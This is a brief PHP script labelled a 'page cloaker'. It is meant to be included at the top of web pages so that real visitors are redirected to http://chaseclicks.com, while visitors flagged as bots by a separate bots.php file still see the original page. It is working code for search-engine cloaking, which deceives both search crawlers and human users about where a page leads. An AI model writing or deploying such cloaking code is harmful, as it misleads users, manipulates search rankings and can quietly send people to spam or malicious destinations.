<?php
// PAGE CLOAKER
//
//	Description: insert this file into any page you'd like to cloak
//	and redirect real users to another page, while showing bots the original page
//
// 	Usage:		insert into top of PHP pages using  	"include ("/full/path/to/page.php");"
 
 
//redirect real users to...
$usr_link = "http://chaseclicks.com"; // This time it will be where USERS are redirected.

//include the bot detection file
include ("./inc/bots.php");
//include the full path so you dont have to have multiple copies
// eg. /home/user/sitename.com/public_html/inc/bots.php 


//check if visitor is NOT a bot, if they are a real visitor, redirect them to the link!
if (!(detect_bot())) { header("Location: $usr_link"); } 

?>